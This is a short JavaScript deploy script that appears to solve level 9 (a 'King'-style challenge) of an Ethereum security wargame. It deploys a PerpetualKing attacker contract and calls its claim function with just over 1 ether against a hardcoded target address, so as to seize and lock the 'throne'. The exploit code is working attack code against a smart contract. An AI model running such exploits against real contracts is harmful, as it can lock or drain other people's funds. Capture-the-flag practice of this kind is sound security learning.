const level9 = async (web3, deployer, PerpetualKing) => {

    const targetAddress = '0xff610b631d9b69c29ffdf66fcab8e66c4946abdf';

    console.log(`Exploiting Level9 target ${targetAddress}...`);

    console.log('Creating PerpetualKing...');
    const perpKing = await deployer.deploy(PerpetualKing);
    console.log('Claiming the throne...');
    const amount = web3.utils.numberToHex(Number(web3.utils.toWei('1')) + 1);
    perpKing.claim(targetAddress, {value: amount});
};

module.exports = level9;